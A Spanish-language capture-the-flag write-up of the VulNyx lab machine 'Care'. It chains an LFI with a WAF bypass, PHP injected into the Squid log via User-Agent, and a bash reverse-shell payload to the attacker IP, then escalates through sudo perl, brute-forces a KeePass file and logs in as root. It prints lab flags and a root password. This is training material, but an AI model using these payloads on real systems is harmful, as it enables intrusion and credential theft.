# Vulnyx — Care
> Laboratorio de pentesting en un entorno controlado. Este documento describe únicamente las pruebas realizadas sobre la máquina **Care** de VulNyx.

---

## Información de la máquina

<img width="558" height="311" alt="image" src="https://github.com/user-attachments/assets/e5a5dc58-9f68-46de-836a-1f4b624f03c1" />

| Campo | Valor |
|---|---|
| **Nombre** | Care |
| **Plataforma** | Vulnyx |
| **IP víctima** | `192.168.0.15` |
| **IP atacante (Kali)** | `192.168.0.13` |
| **Sistema operativo** | Linux — Debian 12 (Bookworm) |
| **Dificultad** | Media |
| **Técnicas clave** | LFI · Bypass de WAF · Log Poisoning (Squid) · sudo/perl (GTFOBins) · KeePass cracking |

---

## Índice

1. [Reconocimiento](#1-reconocimiento)
   - 1.1 [Host Discovery](#11-host-discovery)
   - 1.2 [Identificación del entorno](#12-identificación-del-entorno)
   - 1.3 [Escaneo de puertos y servicios](#13-escaneo-de-puertos-y-servicios)
2. [Enumeración](#2-enumeración)
   - 2.1 [Servicio HTTP (puerto 80)](#21-servicio-http-puerto-80)
   - 2.2 [Detección de LFI en `page.php`](#22-detección-de-lfi-en-pagephp)
3. [Explotación](#3-explotación)
   - 3.1 [Análisis del WAF](#31-análisis-del-waf)
   - 3.2 [LFI con rutas absolutas](#32-lfi-con-rutas-absolutas)
   - 3.3 [Log Poisoning vía Squid → Reverse Shell](#33-log-poisoning-vía-squid--reverse-shell)
4. [Post-explotación y Escalada de privilegios](#4-post-explotación-y-escalada-de-privilegios)
   - 4.1 [www-data → dorian (sudo/perl)](#41-www-data--dorian-sudoperl)
   - 4.2 [Enumeración como dorian: backup KeePass](#42-enumeración-como-dorian-backup-keepass)
   - 4.3 [Crackeo de la base KeePass](#43-crackeo-de-la-base-keepass)
   - 4.4 [dorian → root](#44-dorian--root)
5. [Cadena de ataque](#5-cadena-de-ataque)
6. [Remediación](#6-remediación)

---

## 1. Reconocimiento

### 1.1 Host Discovery

**Hallazgo:** barrido ARP del segmento local para identificar hosts vivos.

```bash
sudo nmap -sn -PR 192.168.0.0/24 -oA host-discovery-inicial
```

<img width="555" height="631" alt="image" src="https://github.com/user-attachments/assets/770f0ddd-3883-4caf-a22c-faa8bd8bc22b" />

**Resultado:** se extraen las IPs activas filtrando el `.gnmap`.

```bash
awk '/Status: Up/ {print $2}' host-discovery-inicial.gnmap
```

<img width="517" height="213" alt="image" src="https://github.com/user-attachments/assets/6690a6bc-9e02-4feb-9774-bec6143adc5c" />

### 1.2 Identificación del entorno

**Hallazgo:** se documentan gateway, segmento de red y sistema operativo de la víctima.

```bash
ip route          # puerta de enlace
ip -br addr       # segmento de red / interfaz
```

<img width="618" height="59" alt="Identificación de puerta de enlace" src="https://github.com/user-attachments/assets/c2b0604a-7d2d-4c6d-baa7-367bb3e52b6a" />

<img width="945" height="77" alt="Identificación de segmento de red" src="https://github.com/user-attachments/assets/8fc7db3d-d3f0-49f8-902d-463bab0b0c7e" />

```bash
sudo nmap -O 192.168.0.15 -oA os-fingerprint-192.168.0.15
```

<img width="952" height="314" alt="Identificación de sisteema operativo" src="https://github.com/user-attachments/assets/4aff6b16-2a54-4918-9799-d03b36eb4713" />

**Resultado:** host Linux (Debian), detrás de NIC de VirtualBox.

### 1.3 Escaneo de puertos y servicios

**Hallazgo:** escaneo TCP completo y detección de versiones.

```bash
# Puertos abiertos (full TCP)
sudo nmap -sS -p- 192.168.0.15 -oA port-scanning-full-tcp-192.168.0.15
```

<img width="610" height="197" alt="Descubrimiento de puertos" src="https://github.com/user-attachments/assets/497b3310-3150-4361-b25b-208a86824bf1" />

```bash
# Detección de servicios/versiones
sudo nmap -sV -p 22,80,3128 192.168.0.15 -oA service-detection-inicial-192.168.0.15
```

<img width="772" height="232" alt="Escaneo de servicios" src="https://github.com/user-attachments/assets/fa38e6a6-bbf1-46de-8c6d-c98bac869adc" />

**Resultado:**

| Puerto | Servicio | Versión |
|---|---|---|
| 22/tcp | SSH | OpenSSH 9.2p1 Debian 2+deb12u3 |
| 80/tcp | HTTP | Apache httpd 2.4.62 (Debian) |
| 3128/tcp | HTTP Proxy | **Squid http proxy 5.7** |

> El **Squid en el 3128** es el servicio que desentona y marca el vector de ataque posterior.

---

## 2. Enumeración

### 2.1 Servicio HTTP (puerto 80)

**Hallazgo:** inspección de cabeceras y contenido.

```bash
curl -I http://192.168.0.15 | tee http-headers-inicial-192.168.0.15.txt
```

<img width="637" height="218" alt="Inspeccion de cabeceras http puerto 80" src="https://github.com/user-attachments/assets/62b286ea-84b5-403b-9021-2125080c77d0" />

En el navegador se ve una plantilla médica genérica **"v-Care"** (contenido *lorem ipsum* → fachada estática):

<img width="979" height="571" alt="Inspección manual en navegador del puerto 80" src="https://github.com/user-attachments/assets/a829263a-c8b3-476f-adc9-39cbac70d7e2" />

Enumeración de directorios y búsqueda de `robots.txt`:

```bash
gobuster dir -u http://192.168.0.15 -w /usr/share/wordlists/dirb/common.txt -t 10 \
  -o gobuster-common-192.168.0.15.txt
```

<img width="952" height="506" alt="Gobuster Directory Enumeration  diccionario common" src="https://github.com/user-attachments/assets/7fd1dbb4-71fb-4288-87e3-1314086e00c7" />

<img width="698" height="309" alt="Búsqueda de archivo robotstxt puerto 80" src="https://github.com/user-attachments/assets/f55181f4-fafe-4dff-bc67-11326832c75a" />

**Resultado:** solo carpetas de assets (`css`, `js`, `img`, `fonts`) y `index.html`. Sin backend aparente... hasta navegar el menú.

### 2.2 Detección de LFI en `page.php`

**Hallazgo:** al navegar "ABOUT US" la URL revela un parámetro que incluye archivos:

```
http://192.168.0.15/page.php?i=about.html
```

<img width="979" height="329" alt="Detección variable php en URL" src="https://github.com/user-attachments/assets/16da560f-ca24-45a9-80b5-50a1fe27961e" />

**Resultado:** parámetro `i=` candidato a **Local File Inclusion (LFI)**.

---

## 3. Explotación

### 3.1 Análisis del WAF

**Hallazgo:** el *path traversal* clásico dispara un WAF casero:

```bash
curl -s "http://192.168.0.15/page.php?i=../../../etc/passwd"
# → <script>alert('⚠️ Security Alert: Malicious Request Detected ...');</script>
```

<img width="610" height="39" alt="Detección de waf en puerto 80 variable php" src="https://github.com/user-attachments/assets/e486c1e3-5ab6-44b7-90ff-90b3a92b1a6d" />

Probando distintos vectores se mapea una **blacklist de palabras clave**. Todos estos quedan bloqueados:

| Vector probado | Resultado |
|---|---|
| `../` (traversal) | ⛔ Bloqueado |
| `php://filter` | ⛔ Bloqueado |
| `/home/dorian/.ssh/id_rsa` | ⛔ Bloqueado |
| `/var/log/auth.log` | ⛔ Bloqueado |
| `/var/log/apache2/access.log` | ⛔ Bloqueado |
| `/proc/version` | ⛔ Bloqueado |
| URL-encoding (`/%70roc/version`) | ⛔ Bloqueado |

<img width="612" height="45" alt="Bloqueo de solicitud puerto 80 variable php a clave SSH de dorian" src="https://github.com/user-attachments/assets/42d3d590-27f8-40b4-a2ad-21ae319928f1" />

<img width="608" height="45" alt="Bloqueo de poisoning a auth log" src="https://github.com/user-attachments/assets/8b371bb1-4b65-40e0-b6bc-a053f0812734" />

<img width="613" height="42" alt="Peticion a variable php procversion bloqueada" src="https://github.com/user-attachments/assets/e20cfcd2-1127-41d3-8a8f-d84c40dcb788" />

<img width="622" height="40" alt="urlencoding bloqueado en variable php" src="https://github.com/user-attachments/assets/be230ba8-1e35-4539-8d2e-04f00281801d" />

<img width="806" height="40" alt="Request a variable php bloqueada" src="https://github.com/user-attachments/assets/8730f826-671a-4e80-8864-cd05f1c99004" />

> El filtro decodifica antes de comparar, por lo que el *URL-encoding* no evade la blacklist. La lista veta a mano las rutas de explotación conocidas (`apache`, `ssh`, `auth`, `proc`, etc.) pero **no** incluye `squid` — pista del camino previsto.

### 3.2 LFI con rutas absolutas

**Hallazgo:** el WAF solo bloquea `../`. Una **ruta absoluta** sin traversal pasa limpia:

```bash
curl -s "http://192.168.0.15/page.php?i=/etc/passwd"
```

<img width="598" height="377" alt="Lectura de etcpasswd direecto exitosa" src="https://github.com/user-attachments/assets/99fe98f2-4308-46f7-b1d6-4ba506e3c40f" />

**Resultado:** LFI confirmado. Se identifica al usuario de interés: **`dorian`** (uid 1000, `/bin/bash`).

### 3.3 Log Poisoning vía Squid → Reverse Shell

**Hallazgo:** dado que `squid` no está en la blacklist, su log de acceso (`/var/log/squid/access.log`) **sí** es incluible. Además, Squid registra el header `User-Agent`, lo que permite inyectar PHP a través del propio proxy.

Listener en la máquina atacante:

```bash
nc -lvnp 443
```

<img width="344" height="99" alt="Escucha en el puerto 443" src="https://github.com/user-attachments/assets/c37c38fc-2741-4b84-b2ef-65d9d4a51d54" />

Inyección del payload en el log de Squid, atravesando el proxy hacia el propio host:

```bash
curl -sX GET -x "http://192.168.0.15:3128" "http://127.0.0.1:80" \
  -A "<?php system('bash -c \"bash -i >& /dev/tcp/192.168.0.13/443 0>&1\"'); ?>"
```

<img width="483" height="442" alt="inyeccion de reverse shell" src="https://github.com/user-attachments/assets/cebea860-9338-4b09-b6cc-4fefdf761361" />

Disparo incluyendo el log envenenado:

```bash
curl -s "http://192.168.0.15/page.php?i=/var/log/squid/access.log"
```

<img width="594" height="50" alt="disparo la inyeccion para obtener reverseshell" src="https://github.com/user-attachments/assets/83ca927c-b72c-4b67-93c1-a1a3fc78719f" />

**Resultado:** shell como **`www-data`**.

```bash
# estabilización de la TTY
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

<img width="484" height="259" alt="obtengo la reverse shell" src="https://github.com/user-attachments/assets/ff2a5861-0951-43ed-ac98-e8c5d7d82944" />

---

## 4. Post-explotación y Escalada de privilegios

### 4.1 www-data → dorian (sudo/perl)

**Hallazgo:** `www-data` puede ejecutar `perl` como `dorian` sin contraseña.

```bash
sudo -l
# (dorian) NOPASSWD: /usr/bin/perl
```

<img width="474" height="181" alt="Enumero permisos sudo y encuentro archivo perl de dorian" src="https://github.com/user-attachments/assets/90ef61f3-1741-4bd7-ad4a-cf321df45dda" />

**Resultado:** abuso vía [GTFOBins](https://gtfobins.github.io/gtfobins/perl/) para obtener shell como dorian y leer la primera flag.

```bash
sudo -u dorian /usr/bin/perl -e 'exec "/bin/bash";'
id          # uid=1000(dorian)
cat /home/dorian/user.txt
# 97c62ffbfe2e1c78d8048ae2a699619a
```

<img width="477" height="249" alt="image" src="https://github.com/user-attachments/assets/6ede43d4-7498-4a2c-819c-74e4e768d01f" />

> Nota: desde `www-data` el directorio `/home/dorian` tiene permisos restrictivos y la `user.txt` no es accesible hasta pivotar al usuario.

<img width="346" height="176" alt="sin permisos para acceder a directori ode dorian" src="https://github.com/user-attachments/assets/4071ab48-ca94-4f2f-b431-e97c6a4145b1" />

### 4.2 Enumeración como dorian: backup KeePass

**Hallazgo:** en el home de dorian hay un directorio oculto `.bak` con un `data.txt`.

```bash
cd ~ && ls -la
```

<img width="475" height="201" alt="Listo archivos ocultos de ldirectori ode dorian y encuentor un backup" src="https://github.com/user-attachments/assets/52356508-68fc-4bb3-ad54-0fa2d3864929" />

```bash
cd ~/.bak && ls -la
file data.txt
# data.txt: Keepass password database 2.x KDBX
```

<img width="477" height="161" alt="Encuentro un datatxt dentr odel backup de dorian" src="https://github.com/user-attachments/assets/9e501e21-a20c-4c57-8bea-add921aea143" />

**Resultado:** base de datos **KeePass (KDBX)**. Candidata a contener credenciales de root.

### 4.3 Crackeo de la base KeePass

**Hallazgo:** se exfiltra la base a la máquina atacante mediante un servidor HTTP temporal.

```bash
# en la víctima (dentro de ~/.bak)
python3 -m http.server 1234
```

<img width="479" height="114" alt="Ejecuto server python en maquina victima para servir el archivo" src="https://github.com/user-attachments/assets/c226660c-964b-4e55-97b2-aed0fd71f657" />

```bash
# en Kali
wget http://192.168.0.15:1234/data.txt
mv data.txt data.kdbx
file data.kdbx    # Keepass password database 2.x KDBX
```

<img width="482" height="202" alt="Descarga de archivo datatxt exitosa" src="https://github.com/user-attachments/assets/8e369cab-66a4-40e9-bb9d-ba5ecf315d22" />

<img width="247" height="25" alt="renombramiento de archivo datatxt a extensio nde backup" src="https://github.com/user-attachments/assets/7bb3a1e6-111a-42d1-a59f-a2eb1181dde0" />

El contenido binario no es legible directamente:

<img width="481" height="439" alt="Simbolos raros al intentar abrirlo" src="https://github.com/user-attachments/assets/c7374709-2bd2-4813-aa64-3790a808176f" />

**Problema:** se trata de un **KDBX 4 (Argon2)**, no soportado por `keepass2john`:

```bash
keepass2john data.kdbx
# ! data.kdbx : File version '40000' is currently not supported!
```

Se usa **keepass4brute** (prueba contraseñas contra `keepassxc-cli`, soporta Argon2):

```bash
sudo apt install keepassxc -y
git clone https://github.com/r3nt0n/keepass4brute
cd keepass4brute
./keepass4brute.sh ../data.kdbx /usr/share/wordlists/rockyou.txt
```

<img width="471" height="118" alt="Instalacion requerimientos para instalar keepass4brute" src="https://github.com/user-attachments/assets/509728da-5e40-40c8-acbb-4281d2627f9e" />

<img width="473" height="551" alt="Clonacio nde repo keepass4brute y fuerza bruta" src="https://github.com/user-attachments/assets/f2b23567-190e-43d7-9cd9-f0d2aab07522" />

**Resultado:** recuperada la *master password*, se abre la base con KeePassXC y se obtiene la credencial del usuario **root**:

```
Usuario:  root
Password: r00tB0$$123!
```

<img width="793" height="572" alt="image" src="https://github.com/user-attachments/assets/1d3c60f5-6c26-4d48-bc82-8bb5cfe1941d" />

### 4.4 dorian → root

**Hallazgo:** credencial de root válida para acceso por SSH.

```bash
ssh root@192.168.0.15
# password: r00tB0$$123!
```

**Resultado:** acceso como **root** y segunda flag.

```bash
whoami        # root
cat /root/root.txt
# 3ba0b1d7e2e14ffd1f5b9788aa957bfd
```

<img width="475" height="330" alt="image" src="https://github.com/user-attachments/assets/c38e2107-1134-41e4-b7c2-4ac02fd12d6f" />


---

## 5. Cadena de ataque

```
nmap (22/80/3128)
   └── HTTP 80: plantilla "v-Care" + page.php?i= (LFI)
         └── WAF por blacklist → bypass con rutas absolutas (no veta "squid")
               └── Log Poisoning de /var/log/squid/access.log (User-Agent vía proxy)
                     └── Reverse Shell → www-data
                           └── sudo -u dorian /usr/bin/perl (GTFOBins) → dorian + user.txt
                                 └── ~/.bak/data.txt (KeePass KDBX4)
                                       └── keepass4brute → master password → cred root
                                             └── ssh root@victima → root + root.txt
```

